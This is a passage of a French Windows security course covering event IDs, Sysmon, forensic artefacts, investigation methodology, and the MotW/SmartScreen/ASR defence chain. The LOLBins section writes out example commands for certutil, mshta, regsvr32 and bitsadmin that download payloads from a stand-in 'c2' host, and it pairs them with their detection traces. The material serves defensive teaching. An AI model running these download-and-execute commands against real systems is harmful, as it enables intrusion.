---
title: Partie VI — Event logs, artefacts et forensic
source: IT/02_Windows/Windows.md
note: Windows en profondeur
up:
- - Windows en profondeur
  - index.md
---

---


## Chapitre 21 — Event Logs Windows

L'architecture Event Logs (EVTX — format XML binaire, C:\Windows\System32\winevt\Logs). Les journaux principaux : Security, System, Application, PowerShell (Microsoft-Windows-PowerShell/Operational), Sysmon (Microsoft-Windows-Sysmon/Operational). Les **Event IDs critiques** : 4624 (logon succès — types 2 interactif/3 réseau/7 unlock/10 RDP), 4625 (échec), 4648 (explicit credentials), 4672 (special privileges), 4688 (process creation — avec command line si audit configuré), 4698 (scheduled task créée), 4720 (account created), 7045 (service installé), 1102 (audit log cleared — effacement de logs = alerte).

L'**Advanced Audit Policy** (les catégories à activer : Account Logon, Logon/Logoff, Object Access, Process Tracking avec command line, Detailed Tracking). Le **command line logging** (GPO : Audit Process Creation + Include command line in process creation events — indispensable pour voir les arguments des processus — sans command line, l'Event 4688 ne montre que le nom de l'exe, pas ce qu'il fait). Les limites : la taille par défaut des journaux est insuffisante (les logs anciens sont écrasés), un attaquant peut effacer les logs (Event 1102 signale l'effacement → centraliser vers le SIEM).

---


## Chapitre 22 — Sysmon et télémétrie avancée

**Sysmon** (System Monitor — outil Sysinternals qui génère une télémétrie riche). Les Event IDs essentiels : **1** (Process Creation — hash, command line, parent, user — le plus utilisé), **3** (Network Connection — processus + IP + port destination), **7** (Image Loaded — DLL chargée), **8** (CreateRemoteThread — injection de code), **10** (Process Access — accès mémoire d'un autre processus → lsass.exe), **11** (File Created), **12/13/14** (Registry events), **19/20/21** (WMI events — persistence), **22** (DNS Query — domaines résolus par processus), **25** (Process Tampering — image hollowing).

La **configuration** (fichier XML — détermine ce qui est loggé ; **SwiftOnSecurity/sysmon-config** est la baseline communautaire de référence ; la configuration doit être adaptée — trop de bruit = logs inutiles, pas assez = angles morts). Le déploiement (GPO ou SCCM/Intune, Sysmon est un driver minifilter → résistant à la désinstallation sans droits admin, mais contournable par BYOVD — Ch.20). La complémentarité avec les Event Logs natifs (Sysmon Event 1 est plus riche que Event 4688 — il inclut le hash du processus, le parent, et la command line nativement).

---


## Chapitre 23 — Artefacts forensic : exécution et persistence

Les artefacts d'**exécution** — chacun répond à « ce programme a-t-il été exécuté ? » : **Prefetch** (C:\Windows\Prefetch — timestamps création=1ère exéc/modification=dernière, run count, fichiers accédés — PECmd ; 128 fichiers max sur Win10/11), **Amcache** (Amcache.hve — chemin, hash SHA-1, éditeur, version, timestamp — AmcacheParser), **ShimCache/AppCompatCache** (registre SYSTEM — chemin, taille, timestamp modification — sur Win10+, présence ≠ exécution certaine — AppCompatCacheParser), **BAM/DAM** (registre SYSTEM — chemin exe + timestamp par utilisateur, ~7 jours — Win10 1709+), **UserAssist** (HKCU — programmes lancés via Explorer, encodé ROT13, run count, timestamps), **SRUM** (SRUDB.dat — utilisation CPU, réseau, énergie par application, 30-60 jours).

Les artefacts de **persistence** : registre (Run, RunOnce, Services, Winlogon, AppInit_DLLs, IFEO, COM CLSID), fichiers (Scheduled Tasks dans C:\Windows\System32\Tasks, Startup folders), WMI (Event Subscriptions — FilterToConsumerBindings), BITS (transferts persistants). **Autoruns** (Sysinternals) = l'outil n°1 pour le triage de persistence — il liste TOUS ces mécanismes en un clic.

---


## Chapitre 24 — Artefacts forensic : fichiers, réseau et mémoire

Les artefacts **fichiers** : **$MFT** (tous les fichiers existants et récemment supprimés, timestamps, taille — MFTECmd), **$UsnJrnl** (journal des modifications — MFTECmd), **LNK** (raccourcis — fichiers accédés, chemins, timestamps, volume serial — LECmd), **Jump Lists** (fichiers récents par application — JLECmd), **Shellbags** (dossiers navigués dans Explorer, même supprimés — ShellBagsExplorer), **Recycle Bin** ($I = métadonnées, $R = contenu — RBCmd), **Zone.Identifier** (ADS — Mark of the Web, source de téléchargement — Streams, Get-Content -Stream).

Les artefacts **réseau** : DNS cache (volatil — ipconfig /displaydns), SRUM données réseau, NetworkList/Profiles (historique des réseaux WiFi). Les artefacts **navigateur** (Chrome/Edge/Firefox — History, Downloads, Cookies, Cache — bases SQLite — Hindsight pour Chrome). Les artefacts **mémoire** (dump RAM — processus cachés, connexions actives, credentials en mémoire, code injecté, commandes — WinPMem, DumpIt pour la capture ; Volatility 3 pour l'analyse — Ch.30).

---


## Chapitre 25 — Investigation Windows : méthodologie structurée

Les 5 étapes : (1) **Préservation** (image disque bit-à-bit — FTK Imager, dump mémoire si machine allumée — WinPMem/DumpIt, hash d'intégrité SHA-256, chaîne de custody — ne jamais travailler sur l'original), (2) **Triage rapide** (les 10 premières minutes — Autoruns, Process Explorer, netstat, Get-ScheduledTask, services récents 7045 — la machine est-elle compromise et par quoi ?), (3) **Timeline** (fusionner Event Logs + Prefetch + Amcache + $UsnJrnl + ShimCache + LNK → Timeline Explorer — Eric Zimmerman), (4) **Analyse en profondeur** (suivre chaque piste de la timeline — d'où vient le fichier ? qui l'a exécuté ? quelles connexions ? quelle persistence ?), (5) **Conclusion et rapport** (IOCs, timeline, impact, vecteur initial, actions correctives).

Live forensics vs dead forensics (live = accès mémoire mais altère l'état ; dead = intégrité préservée mais pas de données volatiles ; bonne pratique : dump mémoire d'abord, image disque ensuite). Les outils : **KAPE** (collecte + parsing automatisé — triage rapide en minutes), **Velociraptor** (agent + serveur — triage à distance sur tout le parc, requêtes VQL), **Autopsy** (plateforme forensic complète — investigation disques).

---


## Chapitre 26 — LOLBins, fileless et chaîne MotW→SmartScreen→ASR

### 26.1 Les LOLBins (Living-off-the-Land Binaries)

Binaires Microsoft légitimes détournés pour exécuter du code malveillant : **certutil** (téléchargement + décodage base64 — certutil -urlcache -split -f http://c2/payload.dll), **mshta** (exécution de HTA/VBScript — mshta http://c2/payload.hta), **rundll32** (exécution de fonctions DLL — le vecteur du fil rouge), **regsvr32** (chargement de COM scriptlets depuis une URL — « Squiblydoo » — regsvr32 /s /n /u /i:http://c2/payload.sct scrobj.dll), **bitsadmin** (téléchargement via BITS — bitsadmin /transfer job http://c2/payload.exe %TEMP%\payload.exe), **wmic** (exécution via WMI — wmic process call create "payload.exe"), **cmstp** (bypass UAC + exécution), **msiexec** (exécution de packages MSI depuis une URL). Chaque LOLBin a ses traces : Sysmon 1 avec la command line suspecte, Sysmon 3 si connexion réseau depuis un LOLBin.

### 26.2 Les techniques fileless

Code exécuté uniquement en mémoire — jamais écrit sur le disque : PowerShell IEX (le code est téléchargé et exécuté en mémoire), .NET reflection (Assembly.Load charge du code .NET en mémoire), Reflective DLL Loading (Ch.9). Pas de hash fichier, pas de scan AV basé sur fichier → la détection repose sur le comportement (EDR), la journalisation (Script Block Logging capture le code PowerShell même fileless), et ETW.

### 26.3 La chaîne de défense MotW → SmartScreen → Protected View → ASR

*Pour les attaques par phishing initial (le vecteur n°1), cette chaîne est le bloc défensif central de Windows.*

Le **Mark of the Web (MotW)** : quand un fichier est téléchargé depuis Internet ou reçu par email, Windows écrit un ADS Zone.Identifier contenant la source (ZoneId=3 = Internet). Ce marquage déclenche toute la chaîne suivante. **SmartScreen** : quand un fichier avec MotW est exécuté, SmartScreen vérifie la réputation du fichier (hash) et de l'URL source auprès de Microsoft → fichier inconnu ou malveillant = avertissement ou blocage. **Office Protected View** : quand un document Office avec MotW est ouvert, il s'ouvre en mode lecture seule (sandbox) — les macros ne s'exécutent PAS tant que l'utilisateur ne clique pas « Activer la modification ». **Macro restrictions** (GPO : bloquer les macros dans les documents provenant d'Internet — la mesure la plus efficace contre le phishing avec macro ; depuis 2022, Microsoft bloque par défaut les macros VBA dans les documents avec MotW). **ASR** (Attack Surface Reduction rules — Defender) : règles qui bloquent des comportements spécifiques même si le code s'exécute (bloquer les processus enfants de Office, bloquer les appels Win32 depuis les macros, bloquer l'exécution de scripts obfusqués, bloquer le téléchargement de contenu exécutable).

Les attaquants contournent la chaîne en **supprimant le MotW** (archives .zip/.rar qui ne préservent pas le MotW dans certaines versions, images disque .iso/.img qui ne marquent pas les fichiers extraits, contournements de SmartScreen — CVE-2023-36025, CVE-2024-21412). Chaque contournement de MotW est une CVE critique car il casse toute la chaîne de protection.

---
